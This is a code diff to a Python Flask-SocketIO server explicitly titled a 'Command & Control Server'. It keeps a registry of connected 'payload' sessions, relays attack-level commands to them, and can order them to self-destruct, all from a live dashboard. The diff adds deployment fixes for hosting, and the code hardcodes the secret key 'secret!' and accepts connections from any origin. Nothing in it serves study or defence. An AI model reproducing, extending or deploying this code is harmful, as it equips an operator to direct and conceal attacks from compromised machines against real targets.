@@ -1,21 +1,36 @@
 # UCAR System: Command & Control Server
-# Updated for Trash Bin Support
+# Author: Sigma
+
+# --- CRITICAL FIX: Monkey Patching ---
+# This must be the very first line of code, before importing Flask.
+import eventlet
+eventlet.monkey_patch()
 
 from flask import Flask
 from flask_socketio import SocketIO, emit, join_room
 import time
 
+# Initialize Flask
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'secret!'
+
+# Initialize SocketIO with CORS allowed for all origins
 socketio = SocketIO(app, async_mode='eventlet', cors_allowed_origins="*")
 
-# Data Store
+# --- Data Store ---
 # { 'session_id': { 'nametag': '...', 'status': 'online', 'last_seen': 0, 'attack_level': 0, 'deleted': False } }
 sessions = {}
 
+# --- Health Check Route (Fixes Render 404 Error) ---
+@app.route('/')
+def health_check():
+    return "UCAR C2 Server is Operational", 200
+
+# --- Background Task: Offline Checker ---
 def check_offline_sessions():
     """Checks for offline sessions."""
     while True:
+        socketio.sleep(10) # Use socketio.sleep for eventlet compatibility
         now = time.time()
         changed = False
         for sid, data in sessions.items():
@@ -25,7 +40,6 @@ def check_offline_sessions():
                 changed = True
         if changed:
             socketio.emit('session_list_update', sessions, namespace='/dashboard')
-        socketio.sleep(10)
 
 socketio.start_background_task(check_offline_sessions)
 
@@ -41,7 +55,9 @@ def handle_attack(data):
     level = data.get('level')
     if sid in sessions:
         sessions[sid]['attack_level'] = level
+        # Relay command to payload
         socketio.emit('command_update_attack', {'level': level}, namespace='/payload', room=sid)
+        # Update dashboards
         emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')
 
 @socketio.on('move_to_trash', namespace='/dashboard')
@@ -50,7 +66,6 @@ def move_to_trash(data):
     sid = data.get('session_id')
     if sid in sessions:
         sessions[sid]['deleted'] = True
-        # Automatically stop attack when moved to trash
         sessions[sid]['attack_level'] = 0
         socketio.emit('command_update_attack', {'level': 0}, namespace='/payload', room=sid)
         emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')
@@ -68,7 +83,6 @@ def permanent_delete(data):
     """Hard delete: Triggers self-destruct and removes from server."""
     sid = data.get('session_id')
     if sid in sessions:
-        # Send kill command
         socketio.emit('command_self_destruct', {}, namespace='/payload', room=sid)
         del sessions[sid]
         emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')
@@ -101,10 +115,10 @@ def payload_register(data):
         sessions[sid]['last_seen'] = time.time()
         
     socketio.emit('session_list_update', sessions, namespace='/dashboard')
+    
     # Sync state
     emit('command_update_attack', {'level': sessions[sid]['attack_level']}, namespace='/payload', room=sid)
     if sessions[sid]['deleted']:
-        # If it reconnects but is supposed to be in trash, ensure it isn't attacking
         emit('command_update_attack', {'level': 0}, namespace='/payload', room=sid)
 
 @socketio.on('payload_heartbeat', namespace='/payload')
